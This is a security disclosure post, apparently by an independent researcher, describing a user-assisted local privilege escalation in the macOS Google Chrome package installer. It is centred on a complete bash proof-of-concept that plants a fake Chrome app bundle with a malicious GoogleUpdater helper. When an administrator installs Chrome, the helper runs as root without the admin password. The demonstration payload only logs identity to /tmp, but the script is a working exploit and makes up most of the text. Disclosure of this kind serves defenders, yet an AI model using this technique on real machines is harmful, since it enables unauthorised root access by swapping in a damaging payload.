## macOS User-assisted Local Privilege Escalation when installing Google Chrome


You can try this for yourself, with this link on webarchive: [googlechrome.pkg](https://web.archive.org/web/20260113235628/https://dl.google.com/chrome/mac/stable/accept_tos%3Dhttps%3A%2F%2Fwww.google.com%2Fintl%2Fen_ph%2Fchrome%2Fterms%2F%26_and_accept_tos%3Dhttps%3A%2F%2Fpolicies.google.com%2Fterms/googlechrome.pkg)


1. run the prepare script (`prepare.sh`)
2. wait till a legitemate administrator installs the Google Chrome via the installer package.
3. once the real administrator installs this, then we have executed code as `root` **without knowing the Administrator password**


```sh
#!/bin/bash
# Google Chrome user-assisted Local Privilege Escalation
# Author: Kun Peeks (@SwayZGl1tZyyy)
# sunday 1 february 2026 (01-02-2026)
set -e

APP_PATH="/Applications/Google Chrome.app"
FAKE_BUNDLE_ID="com.fake.chrome"

echo "[*] Creating malicious setup..."

# rm existing
rm -rf "$APP_PATH"

# create full malicious structure
mkdir -p "$APP_PATH/Contents/MacOS"
mkdir -p "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helpers/GoogleUpdater.app/Contents/MacOS"

# maclicous GoogleUpdater
cat > "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helpers/GoogleUpdater.app/Contents/MacOS/GoogleUpdater" << 'EOF'
#!/bin/bash
{
    echo "The administrator has installed Google Chrome via the package installer"
    echo "we have gained root without knowing the admin password"
    echo "Executed as: $(whoami)"
    echo "UID: $(id -u)"
    id
    date
} > /tmp/chrome_pwned.txt
chmod 644 /tmp/chrome_pwned.txt
logger "Chrome LPE PoC executed as $(whoami)"
# Don't exit immediately - let GoogleUpdater think it worked
sleep 2
EOF
chmod +x "$APP_PATH/Contents/Frameworks/Google Chrome Framework.framework/Helpers/GoogleUpdater.app/Contents/MacOS/GoogleUpdater"

# create fake main binary
cat > "$APP_PATH/Contents/MacOS/Google Chrome" << 'EOF'
#!/bin/bash
echo "Fake Chrome"
EOF
chmod +x "$APP_PATH/Contents/MacOS/Google Chrome"

# Info.plist with fake bundle ID to trigger .localized
cat > "$APP_PATH/Contents/Info.plist" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>${FAKE_BUNDLE_ID}</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleShortVersionString</key>
    <string>120.0.0.0</string>
    <key>CFBundleVersion</key>
    <string>120.0.0.0</string>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>KSProductID</key>
    <string>com.google.Chrome</string>
    <key>KSVersion</key>
    <string>120.0.0.0</string>
</dict>
</plist>
EOF

echo "[+] setup complete!"
echo "[!] now wait till an administrator installs Google Chrome .pkg"
echo "[!] after install, check: cat /tmp/chrome_pwned.txt"
```




#### disclosure

I'm dislosing this because Google/Chromium doesn't see admin->root as a valid local privilege escalation... So now they're fixing this vulnerability as "spoofing" a bug with "no security impact". (https://issuetracker.google.com/u/2/issues/481590122) 

A bit unfortunate that I reported this to Google Chrome, as this could've been useful for red teamers. 
